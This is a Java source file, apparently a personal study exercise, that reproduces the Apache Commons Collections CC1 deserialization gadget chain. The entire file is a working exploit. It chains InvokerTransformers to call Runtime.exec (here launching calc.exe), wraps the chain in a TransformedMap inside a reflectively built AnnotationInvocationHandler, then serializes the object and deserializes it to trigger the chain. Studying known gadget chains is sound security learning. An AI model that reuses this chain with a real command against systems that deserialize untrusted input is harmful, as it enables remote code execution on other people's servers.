package CommonsCollection.Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: CommonsCollection.Clown_CC1
 * @Author: Clown
 * @CreateTime: 2023-07-09  15:43
 */
public class POC复盘 {
    public static void  Serialization(Object object) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("poc.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        fileOutputStream.close();
        System.out.println("序列化成功");
    }
    public static void UnSerialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("poc.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        fileInputStream.close();
        System.out.printf("反序列化成功");
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"C:\\Windows\\System32\\calc.exe" }),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
        objectObjectHashMap.put("value","aaa");
        Map decorate = TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Retention.class, decorate);
        Serialization(o);
        UnSerialization();
    }
}
